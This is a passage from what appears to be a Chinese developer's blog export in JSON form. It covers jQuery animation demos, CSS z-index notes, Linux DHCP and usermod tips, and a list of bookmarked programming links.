class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>再好幾年前看到網頁設計要避免使用table<br>不過這個方法還滿簡單對齊</p>\n<p>置於動態效果是用<br><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">\"#fukidashi\"</span>).hover(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">$(<span class=\"string\">\".fukidashi img\"</span>).stop().animate(&#123;<span class=\"string\">\"width\"</span>:<span class=\"string\">\"215px\"</span>,<span class=\"string\">\"height\"</span>:<span class=\"string\">\"305px\"</span>&#125;,<span class=\"number\">100</span>);</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">$(<span class=\"string\">\".fukidashi img\"</span>).stop().animate(&#123;<span class=\"string\">\"width\"</span>:<span class=\"string\">\"1px\"</span>,<span class=\"string\">\"height\"</span>:<span class=\"string\">\"1px\"</span>&#125;,<span class=\"number\">200</span>);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>沒想到JQuery的animate function可以做出此特效</p>\n<hr>\n<p>最後手動實例一下吧<br><a href=\"http://plnkr.co/edit/ziBX7eMesKRXoz1urVnY?p=preview\" target=\"_blank\" rel=\"noopener\">實例成果</a><br><figure class=\"highlight html\"><figcaption><span>index.html</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"style.css\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">data-require</span>=<span class=\"string\">\"jquery@2.1.1\"</span> <span class=\"attr\">data-semver</span>=<span class=\"string\">\"2.1.1\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.1/jquery.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"script.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">href</span>=<span class=\"string\">\"style.css\"</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>天線寶寶說你好<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"wrap\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"main\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"image\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"word\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">table</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">      你好</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight javascript\"><figcaption><span>script.js</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Code goes here</span></span><br><span class=\"line\">$(<span class=\"built_in\">document</span>).ready(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">  $(<span class=\"string\">\"div.image\"</span>).hover(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  $(<span class=\"string\">\".word\"</span>).stop().animate(&#123;<span class=\"string\">\"font-size\"</span>:<span class=\"string\">\"50px\"</span>&#125;,<span class=\"number\">100</span>);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  $(<span class=\"string\">\".word\"</span>).stop().animate(&#123;<span class=\"string\">\"font-size\"</span>:<span class=\"string\">\"1px\"</span>&#125;,<span class=\"number\">200</span>);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight css\"><figcaption><span>style.css</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">div</span><span class=\"selector-class\">.image</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">position</span>:absolute;</span><br><span class=\"line\">  <span class=\"attribute\">top</span>:<span class=\"number\">300px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">left</span>:<span class=\"number\">300px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-image</span>: <span class=\"built_in\">url</span>(<span class=\"string\">'data:image/png;base64,....);</span></span><br><span class=\"line\"><span class=\"string\">\twidth:            189px;</span></span><br><span class=\"line\"><span class=\"string\">\theight:           240px;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">div.wrap &#123;</span></span><br><span class=\"line\"><span class=\"string\">  height:600px;</span></span><br><span class=\"line\"><span class=\"string\">  background-repeat: no-repeat;</span></span><br><span class=\"line\"><span class=\"string\">\tbackground-position: center top;</span></span><br><span class=\"line\"><span class=\"string\">  background-image: url('</span>data:image/png;base64,...);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">div</span><span class=\"selector-class\">.word</span> <span class=\"selector-tag\">table</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>:<span class=\"number\">100%</span>;</span><br><span class=\"line\">  <span class=\"attribute\">height</span>:<span class=\"number\">100%</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">div</span><span class=\"selector-class\">.word</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">position</span>:absolute;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>:<span class=\"number\">200px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">height</span>:<span class=\"number\">100px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">top</span>:<span class=\"number\">200px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">left</span>:<span class=\"number\">290px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">font-size</span>:<span class=\"number\">1px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">div</span><span class=\"selector-class\">.word</span> <span class=\"selector-tag\">td</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">text-align</span>:center;</span><br><span class=\"line\">  <span class=\"attribute\">vertical-align</span>:bottom;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">div</span><span class=\"selector-class\">.main</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">position</span>:relative;</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>:           <span class=\"number\">600px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最後做這個範例也花了我不少時間<br>由於Easy GO裡的GIMP和Krita都不太會使用… 耗了我滿久的時間(本人美功也很爛)<br>然後欄的用說話框，就改成字體放大<br>這個實例可能有點弱。哈。</p>\n","categories":["網頁特效"],"tags":["vertical-align"]},{"title":"記錄網頁特效動機","url":"/blog/2014/07/05/logdown/2014-07-05-web-effects-notes/","content":"<p>最近看到一些日本動畫網站做的越來越厲害<br>以前看到動態以為是Flash做出來的東西<br>但仔細一看，竟然是HTML5+JavaScript合出來的東西<br>於是我對一些網站製作手法開始有興趣了<br><a id=\"more\"></a></p>\n<p>其實我大學的時候沒打算去碰前端美功東西<br>因為知道自已沒有美功天份<br>加上寫程式就要發很多時間(自已能力可能不足…orz)<br>所以大學程式介面都不是能看的</p>\n<p>之前大學二年級因為覺得當時AJAX很神奇<br>但JavaScript真的沒有什麼碰過，買了<code>JavaScript大全</code>傳說中的聖經<br>而且書某些地方還滿難的，所以就沒繼續下去<br>然後就看到JQuery，當出某網站寫JQuery <strong>寫的少，做的多，跨任合平台</strong><br>當時jQuery中文書很少，只有一本…   <a href=\"http://www.books.com.tw/products/0010581307\" target=\"_blank\" rel=\"noopener\">網頁設計．愛上jQuery</a><br>英文苦手的我沒辦法讀網路相關英文文件，之後查到有相關中文書，就去學校圖書館推薦，苦等了三個月終於書來了</p>\n<p>由於沒有相關CSS Selector觀念，再加上當時碰過程式語言只有Java、PHP<br>所以接觸JQuery程式語言寫法<code>$(&quot;id or elemnt or css selector&quot;)</code> ，說真的不知道耗我幾天的時間<br>我完完全全都是靠自已測試好幾次，才了解要怎麼使用<br>最後的困難，就是利用AJAX實現GET、POST<br>由於當時不會使用Firebug，所以瀏覽器點下沒動作就傻傻到裡面去看程式碼有沒有問題<br>不像現在Firefox、Chrome有<code>Ctrl+Alt+i</code>就有網頁開發工具方便(也許那時候以前有也說不定orz)</p>\n<p>最近這幾年JQuery看到很多網站應用越來越多了<br>雖然我現在還是覺得JQuery能力不是說很好，每次寫的程式都很臭長，但是JQuery已經可以滿足我目前控制需求<br>當出記畫打算從JQuery→JavaScript，但沒想到JQuery滿足我後，我之後都沒去碰JavaScript了<br>有點後悔當出要先從JavaScript→JQuery</p>\n<p>最後<br><del>我當然不是要當copycat</del><br>我希望看到別人不錯的特效，查看原始碼看如何實現的<br>加以記錄，雖然我目前打算應該打算朝後端工程式為目標<br>但是最近Web相關技術(Bootstrap、AnjularJS…等等)都越來越紅，紅到我都感到有興趣了<br>也許未來我做網站可能會用到，也許我跑去當前端工程師也說不定…<br>未來的事誰知道…</p>\n","categories":["網頁特效"]},{"title":"利用影片來做背景動態效果","url":"/blog/2014/07/06/logdown/2014-07-06-using-films-to-do-a-background-animation/","content":"<p>最近逛到<a href=\"http://mikakunin.jp/index.html\" target=\"_blank\" rel=\"noopener\">未確認進行式動畫官網</a><br>看到背景是動態畫面，第一個直覺這是<code>Flash</code><br>但右鍵不是!!!!<br>奇怪就算是HTML5播放影片右鍵應該可以控制影片<br><a id=\"more\"></a></p>\n<p>簡單看了一下原始碼<br>是用HTML5裡的Video來播放了，但怎麼沒辦法右鍵控制???<br>其實最外面的那一層<strong>#headWrap</strong>把Video擋住了</p>\n<p>其實div還用滿多z-index圖層</p>\n<p>目前搞不懂#headWrap的z-index:20<br>Video的z-index:40<br>#headWrap可以在Video上面</p>\n<p>最後，找到<a href=\"http://www.css-101.org/z-index/playground.php\" target=\"_blank\" rel=\"noopener\">z-index playground</a><br>雖然左邊英文看不懂orz，但是簡單玩了一下右邊圖層關係<br><code>某div裡的div的z-index</code>跟外面div裡的z-index比較<br>會對照<code>某div裡的div的z-index</code>的parent div  z-index去跟外面比較<br>而非div裡面的z-index<br><strong><em>此說法可能有錯誤</em></strong></p>\n<p>所以<a href=\"http://mikakunin.jp/index.html\" target=\"_blank\" rel=\"noopener\">未確認進行式動畫官網</a><br>#headWrap的z-index:20<br>雖然Video的z-index:40，但是外層的#visualWrap的z-index:10<br>所以#headWrap就在上面</p>\n<p>雖然有找到<a href=\"http://www.neoease.com/css-z-index-property-and-layering-tree/\" target=\"_blank\" rel=\"noopener\">CSS z-index 屬性的使用方法和層級樹的概念</a><br>但親身玩一下<a href=\"http://www.css-101.org/z-index/playground.php\" target=\"_blank\" rel=\"noopener\">z-index playground</a>才會比較清楚</p>\n<hr>\n<p>話說看暗殺教室和未確認進行式官網的CSS寫法<br>感覺網頁設計師是用SASS寫出來的0.0<br>可惜目前CSS能力不足，可能沒辦法碰此部份orz</p>\n","categories":["網頁特效"],"tags":["position","z-index"]},{"title":"JQuery相關Animate function筆記","url":"/blog/2014/07/09/logdown/2014-07-09-jquery-animate-notes/","content":"<p>最近發現JQuery 有人用Animate做背景動態效果<br><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">'body'</span>).stop().animate(&#123;<span class=\"attr\">backgroundColor</span>:<span class=\"string\">'#00b1ff'</span>&#125;,<span class=\"number\">500</span>);</span><br></pre></td></tr></table></figure></p>\n<p>自已用plunker測試發現不能使用<br>原來需要裝一個套件才能用<br><a id=\"more\"></a></p>\n<blockquote>\n<p>All animated properties should be animated to a single numeric value, except as noted below; most properties that are non-numeric cannot be animated using basic jQuery functionality (For example, width, height, or left can be animated but background-color cannot be, unless the jQuery.Color() plugin is used). Property values are treated as a number of pixels unless otherwise specified. The units em and % can be specified where applicable.</p>\n</blockquote>\n<p><a href=\"https://github.com/jquery/jquery-color\" target=\"_blank\" rel=\"noopener\">jquery-color套件</a><br>套件能用Animate套用CSS屬性如下</p>\n<blockquote>\n<p>Supported properties</p>\n</blockquote>\n<hr>\n<p>backgroundColor, borderBottomColor, borderLeftColor, borderRightColor, borderTopColor, color, columnRuleColor, outlineColor, textDecorationColor, textEmphasisColor</p>\n<h2 id=\"Stop\"><a href=\"#Stop\" class=\"headerlink\" title=\"Stop()\"></a>Stop()</h2><p>Stop()能暫停animate動作</p>\n<h2 id=\"delay\"><a href=\"#delay\" class=\"headerlink\" title=\"delay()\"></a>delay()</h2><p>延遲animate動作時間</p>\n<p>簡單滑入滑出動作範例</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">\"h1\"</span>).hover(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t$(<span class=\"keyword\">this</span>).fadeTo(<span class=\"number\">0</span>, <span class=\"number\">0.7</span>);</span><br><span class=\"line\">\t&#125;,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t$(<span class=\"keyword\">this</span>).fadeTo(<span class=\"number\">0</span>, <span class=\"number\">1.0</span>);</span><br><span class=\"line\">  &#125;);</span><br></pre></td></tr></table></figure>\n","categories":["網頁特效"],"tags":["animate"]},{"title":"Linux DHCP DNS重開機跑掉的問題","url":"/blog/2014/08/25/logdown/2014-08-25-linux-dhcp-dns-to-turn-off-problem/","content":"<p>在Google搜尋到解決方法<a href=\"http://ithelp.ithome.com.tw/question/10071258\" target=\"_blank\" rel=\"noopener\">Linux DHCP DNS設定問題</a><br>有空測試一下，先記錄一下。</p>\n<blockquote>\n<p>主機使用 DHCP 取得 IP，有時後會出現明明就設定好了，但是重開機後DNS的設定又跑掉的問題。<br>若是有此問題，請修改該網卡的設定。<br>設定完DNS後，請修改網卡的部份。(假設網卡為eth0)<br>請加入PEERDNS=no後重啟網路或重開機就行了。</p>\n</blockquote>\n<blockquote>\n<p>詳細內容請參考<a href=\"http://blog.faq-book.com/?p=2717\" target=\"_blank\" rel=\"noopener\">http://blog.faq-book.com/?p=2717</a></p>\n</blockquote>\n","categories":["Linux"],"tags":["Linux","DHCP","DNS"]},{"title":"Linux 利用 usermod 修改使用者的參數和資料","url":"/blog/2014/09/15/logdown/2014-09-15-linux-use-usermod-to-modify-the-users-parameters-and-data/","content":"<blockquote>\n<p>修改使用者帳號資訊（管理者）</p>\n</blockquote>\n<h1 id=\"usermod-l-newname-username-變更使用者帳號名稱\"><a href=\"#usermod-l-newname-username-變更使用者帳號名稱\" class=\"headerlink\" title=\"usermod -l newname username　　　　　# 變更使用者帳號名稱\"></a>usermod -l newname username　　　　　# 變更使用者帳號名稱</h1><h1 id=\"usermod-o-u-101-username-變更使用者-UID\"><a href=\"#usermod-o-u-101-username-變更使用者-UID\" class=\"headerlink\" title=\"usermod -o -u 101 username　　　　　 # 變更使用者 UID\"></a>usermod -o -u 101 username　　　　　 # 變更使用者 UID</h1><h1 id=\"usermod-g-users-username-變更使用者主要群組\"><a href=\"#usermod-g-users-username-變更使用者主要群組\" class=\"headerlink\" title=\"usermod -g users username　　　　　　# 變更使用者主要群組\"></a>usermod -g users username　　　　　　# 變更使用者主要群組</h1><h1 id=\"usermod-G-mis-sales-username-變更使用者次要群組\"><a href=\"#usermod-G-mis-sales-username-變更使用者次要群組\" class=\"headerlink\" title=\"usermod -G mis,sales username　　　　# 變更使用者次要群組\"></a>usermod -G mis,sales username　　　　# 變更使用者次要群組</h1><h1 id=\"usermod-c-“manager”-username-修改使用者註解內容\"><a href=\"#usermod-c-“manager”-username-修改使用者註解內容\" class=\"headerlink\" title=\"usermod -c “manager” username　　　 # 修改使用者註解內容\"></a>usermod -c “manager” username　　　 # 修改使用者註解內容</h1><h1 id=\"usermod-m-d-home-user-username-變更使用者家目錄路徑\"><a href=\"#usermod-m-d-home-user-username-變更使用者家目錄路徑\" class=\"headerlink\" title=\"usermod -m -d /home/user username　# 變更使用者家目錄路徑\"></a>usermod -m -d /home/user username　# 變更使用者家目錄路徑</h1><h1 id=\"usermod-s-usr-bin-ksh-username-變更使用者預設-Shell\"><a href=\"#usermod-s-usr-bin-ksh-username-變更使用者預設-Shell\" class=\"headerlink\" title=\"usermod -s /usr/bin/ksh username　　 # 變更使用者預設 Shell\"></a>usermod -s /usr/bin/ksh username　　 # 變更使用者預設 Shell</h1><h1 id=\"usermod-e-1-1-2010-username-變更使用者過期期限\"><a href=\"#usermod-e-1-1-2010-username-變更使用者過期期限\" class=\"headerlink\" title=\"usermod -e 1/1/2010 username　　　　# 變更使用者過期期限\"></a>usermod -e 1/1/2010 username　　　　# 變更使用者過期期限</h1><h1 id=\"usermod-p-FEeig-jYifke-username-變更使用者密碼\"><a href=\"#usermod-p-FEeig-jYifke-username-變更使用者密碼\" class=\"headerlink\" title=\"usermod -p FEeig.jYifke username　　 # 變更使用者密碼\"></a>usermod -p FEeig.jYifke username　　 # 變更使用者密碼</h1><p> 來源：<a href=\"http://blog.yam.com/gavint/article/23264761\" target=\"_blank\" rel=\"noopener\">http://blog.yam.com/gavint/article/23264761</a></p>\n<blockquote>\n<p>Linux usermod -p 修改用户密码</p>\n</blockquote>\n<hr>\n<p>passwd也可以修改口令，但是这是一种交互式的方式，需要用户干预。当然也可以使用重定向或者管道向passwd喂数据，暂且不提。<br>linux下增加用户的命令是useradd，修改用户的命令是usermod，二者都有一个参数 –p，这个参数可以直接指定用户的口令，但是需要注意的是，这个口令并不是明文，而是经过加密的一个字串。<br>linux下可以用python编辑器通过编程的方法得到加密字串（linux下用python命令启动编辑器）：<br>下面是一个完整的过程，蓝色字体的是用户输入的命令，而红色的是系统输出。<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@linux ~]# python</span><br><span class=\"line\">Python 2.3.4 (#1, Oct 26 2004, 16:42:40)</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">[GCC <span class=\"number\">3.4</span><span class=\"number\">.2</span> <span class=\"number\">20041017</span> (Red Hat <span class=\"number\">3.4</span><span class=\"number\">.2</span><span class=\"number\">-6.</span>fc3)] on linux2</span><br><span class=\"line\">Type <span class=\"string\">\"help\"</span>, <span class=\"string\">\"copyright\"</span>, <span class=\"string\">\"credits\"</span> <span class=\"keyword\">or</span> <span class=\"string\">\"license\"</span> <span class=\"keyword\">for</span> more information.</span><br><span class=\"line\"> <span class=\"keyword\">import</span> crypt;print(crypt.crypt(<span class=\"string\">\"your password\"</span>,<span class=\"string\">\"ab\"</span>));</span><br><span class=\"line\">ab62Jfo2yjBEo</span><br><span class=\"line\">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>\n<p>上面用户输入信息中的“your password”可以替换为需要加密的口令，“ab”可替换为任意的两个大小写字符或者数字，而“ab62Jfo2yjBEo”就是加密后的密文。<br>一个简单的例子如下：<br>useradd –p ab62Jfo2yjBEo testuser<br>usermod –p ab62Jfo2yjBEo testuser</p>\n<p>來源：<a href=\"http://www.cppblog.com/aaxron/archive/2010/12/02/135251.html\" target=\"_blank\" rel=\"noopener\">http://www.cppblog.com/aaxron/archive/2010/12/02/135251.html</a></p>\n","categories":["Linux"],"tags":["Linux","usermod"]},{"title":"2014  隨意筆記紀錄","url":"/blog/2014/09/03/logdown/2014-09-03-2014-random-notes/","content":"<p>收集一些網路覺得不錯的東西，會記錄下面。<br>希望有時間要找過去想看的，也是非常方便的一件事。<br><a id=\"more\"></a></p>\n<p>2014/12</p>\n<p>使瀏覽器的上一頁按鍵無效<br><a href=\"http://windwaterbo-blog.logdown.com/posts/245123-disable-back-button-in-browser-using-javascript\" target=\"_blank\" rel=\"noopener\">http://windwaterbo-blog.logdown.com/posts/245123-disable-back-button-in-browser-using-javascript</a></p>\n<p>一段白爛往事(O(n^2)降成O(n))<br><a href=\"http://blog.rayer.idv.tw/posts/245160-for-some-stupid-memories\" target=\"_blank\" rel=\"noopener\">http://blog.rayer.idv.tw/posts/245160-for-some-stupid-memories</a></p>\n<p>HTML5 的 File 相關物件<br><a href=\"http://jamestw.logdown.com/posts/245135-html5-file-api\" target=\"_blank\" rel=\"noopener\">http://jamestw.logdown.com/posts/245135-html5-file-api</a></p>\n<p>[Python] 套件管理程式<br><a href=\"http://lucianyo.logdown.com/posts/245094\" target=\"_blank\" rel=\"noopener\">http://lucianyo.logdown.com/posts/245094</a></p>\n<p>Android讀取外部sdcard圖片<br><a href=\"http://shamangary-blog.logdown.com/posts/245120-android-reads-external-sdcard-pictures\" target=\"_blank\" rel=\"noopener\">http://shamangary-blog.logdown.com/posts/245120-android-reads-external-sdcard-pictures</a></p>\n<p>jquery Form表單修改後未儲存提示<br><a href=\"http://joel-zhong.logdown.com/posts/2014/12/02/jquery-alert-for-unsaved-changes-in-form\" target=\"_blank\" rel=\"noopener\">http://joel-zhong.logdown.com/posts/2014/12/02/jquery-alert-for-unsaved-changes-in-form</a></p>\n<p>Vim.js<br><a href=\"http://coolwanglu.github.io/vim.js/experimental/vim.html\" target=\"_blank\" rel=\"noopener\">http://coolwanglu.github.io/vim.js/experimental/vim.html</a></p>\n<p>Debian Java-Bridge精簡安裝(免裝Tomcat)[PHP能執行JAVA]<br><a href=\"http://vega02.blogspot.tw/2010/10/debian-java-bridgetomcat.html\" target=\"_blank\" rel=\"noopener\">http://vega02.blogspot.tw/2010/10/debian-java-bridgetomcat.html</a></p>\n<p>Java  optional parameters(差點忘記這玩意，但好像只有JAVA有)<br><a href=\"http://stackoverflow.com/questions/1737350/java-optional-parameters\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/1737350/java-optional-parameters</a></p>\n<p>T客邦目前使用的 code 品質輔助工具<br><a href=\"http://ascendbruce.logdown.com/posts/243326-code-quality-tool-used-in-techbang\" target=\"_blank\" rel=\"noopener\">http://ascendbruce.logdown.com/posts/243326-code-quality-tool-used-in-techbang</a></p>\n<p>ReactJS 初學心得<br><a href=\"http://www.kvzhuang.net/posts/245658-reactjs-beginner-tips\" target=\"_blank\" rel=\"noopener\">http://www.kvzhuang.net/posts/245658-reactjs-beginner-tips</a></p>\n<p>PhoneGap 09 使用Plugman管理Plugins<br><a href=\"http://blog.csdn.net/jacob_wang520/article/details/18319471\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/jacob_wang520/article/details/18319471</a></p>\n<p>程式碼準則 by @mdo<br><a href=\"http://lisp.es/code-guide/\" target=\"_blank\" rel=\"noopener\">http://lisp.es/code-guide/</a></p>\n<p>快快樂樂用Homestead (PHP Framework - Laravel)<br><a href=\"http://www.slideshare.net/warfan/homestead-42836254\" target=\"_blank\" rel=\"noopener\">http://www.slideshare.net/warfan/homestead-42836254</a></p>\n<p>discuz 的加密與解密函數authcode解析<br><a href=\"http://www.wkii.org/discuz-encryption-and-decryption-functions-authcode-analysis.html\" target=\"_blank\" rel=\"noopener\">http://www.wkii.org/discuz-encryption-and-decryption-functions-authcode-analysis.html</a></p>\n<p>Python版本的autocode加解密函数<br><a href=\"http://bbs.bccn.net/thread-300363-1-1.html\" target=\"_blank\" rel=\"noopener\">http://bbs.bccn.net/thread-300363-1-1.html</a></p>\n<p>關於配色這回事<br><a href=\"http://baggywalking.blogspot.tw/2008/02/blog-post_560.html\" target=\"_blank\" rel=\"noopener\">http://baggywalking.blogspot.tw/2008/02/blog-post_560.html</a></p>\n<p>淺談Spine與Angular框架比較<br><a href=\"http://jazznote.logdown.com/posts/247111-framework-of-the-discussion-on-the-spine\" target=\"_blank\" rel=\"noopener\">http://jazznote.logdown.com/posts/247111-framework-of-the-discussion-on-the-spine</a></p>\n<p>[R-Pi] 自動載掛外接式硬碟<br><a href=\"http://worldofwen.logdown.com/posts/247476-r-pi-automatically-load-hanging-on-an-external-hard-drive\" target=\"_blank\" rel=\"noopener\">http://worldofwen.logdown.com/posts/247476-r-pi-automatically-load-hanging-on-an-external-hard-drive</a></p>\n<p>ReactJS Examples, Demos, Code<br><a href=\"http://react.rocks/\" target=\"_blank\" rel=\"noopener\">http://react.rocks/</a><br>ReactStar<br><a href=\"http://rawgit.com/ndyag/react-rater/master/example/index.html\" target=\"_blank\" rel=\"noopener\">http://rawgit.com/ndyag/react-rater/master/example/index.html</a></p>\n<p>[Python] IPython簡單使用技巧速記<br><a href=\"http://enginebai.logdown.com/posts/247825/ipython-tips\" target=\"_blank\" rel=\"noopener\">http://enginebai.logdown.com/posts/247825/ipython-tips</a></p>\n<hr>\n<p>2014/11<br>使用 Mac 連線到 Raspberry Pi (USB to TTL)<br><a href=\"http://chsien.logdown.com/posts/2014/07/05/mac-raspberry-pi-usb\" target=\"_blank\" rel=\"noopener\">http://chsien.logdown.com/posts/2014/07/05/mac-raspberry-pi-usb</a></p>\n<p>Rails 與 AngularJS 混搭風<br><a href=\"http://chsien.logdown.com/posts/2014/10/30/rails-and-angularjs-mixed-wind-start\" target=\"_blank\" rel=\"noopener\">http://chsien.logdown.com/posts/2014/10/30/rails-and-angularjs-mixed-wind-start</a></p>\n<p>Is [web] down for everyone or just me?<br><a href=\"http://www.downforeveryoneorjustme.com/\" target=\"_blank\" rel=\"noopener\">http://www.downforeveryoneorjustme.com/</a></p>\n<p>position: sticky<br>註： Firefox 有支援 position: sticky ； Safari 支援 position: -webkit-stikcy<br><a href=\"http://html5-demos.appspot.com/static/css/sticky.html\" target=\"_blank\" rel=\"noopener\">http://html5-demos.appspot.com/static/css/sticky.html</a><br><a href=\"http://jsfiddle.net/jaceju/7ak0714c/\" target=\"_blank\" rel=\"noopener\">http://jsfiddle.net/jaceju/7ak0714c/</a></p>\n<p>使用Skrollr.js實作視差滾動<br><a href=\"http://blog.friendo.com.tw/posts/240944-prallax-scrolling-by-skrollr\" target=\"_blank\" rel=\"noopener\">http://blog.friendo.com.tw/posts/240944-prallax-scrolling-by-skrollr</a></p>\n<p>OSQuery<br><a href=\"http://osquery.io/\" target=\"_blank\" rel=\"noopener\">http://osquery.io/</a><br><a href=\"https://github.com/facebook/osquery\" target=\"_blank\" rel=\"noopener\">https://github.com/facebook/osquery</a></p>\n<p>Fake images please?<br><a href=\"http://fakeimg.pl/\" target=\"_blank\" rel=\"noopener\">http://fakeimg.pl/</a></p>\n<p>使用 Screen 指令操控 UNIX/Linux 終端機的教學與範例<br><a href=\"http://www.gtwang.org/2013/11/screen-command-examples-to-manage-linux-terminals.html\" target=\"_blank\" rel=\"noopener\">http://www.gtwang.org/2013/11/screen-command-examples-to-manage-linux-terminals.html</a><br><a href=\"http://www.dotblogs.com.tw/bowwowxx/archive/2014/08/30/146410.aspx\" target=\"_blank\" rel=\"noopener\">http://www.dotblogs.com.tw/bowwowxx/archive/2014/08/30/146410.aspx</a></p>\n<p>selenium<br><a href=\"http://www.seleniumhq.org/\" target=\"_blank\" rel=\"noopener\">http://www.seleniumhq.org/</a><br><a href=\"http://www.jaceju.net/blog/archives/1293/\" target=\"_blank\" 